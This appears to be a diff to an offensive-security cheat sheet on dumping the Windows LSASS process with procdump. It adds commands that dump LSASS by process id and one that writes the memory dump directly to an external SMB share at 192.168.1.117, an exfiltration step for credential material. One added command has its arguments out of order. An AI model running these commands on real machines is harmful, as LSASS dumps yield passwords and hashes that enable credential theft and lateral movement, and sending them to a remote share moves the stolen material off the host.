@@ -4,6 +4,7 @@
 - We can dump `lsass.exe` using `procdump.exe`
 ```
 procdump.exe -accepteula -ma lsass.exe lsass_dump
+procdump.exe (ps lsass).id data -ma
 ```
 - Also can be done using PID
 ```
@@ -12,6 +13,10 @@ OR
 tasklist | findstr lsass
 
 procdump.exe -accepteula -ma 580 out.dmp
+```
+- Also can be done to an external share
+```
+procdump.exe (ps lsass).id \\192.168.1.117\share\data -ma
 ```
 
 ### Task Manager:
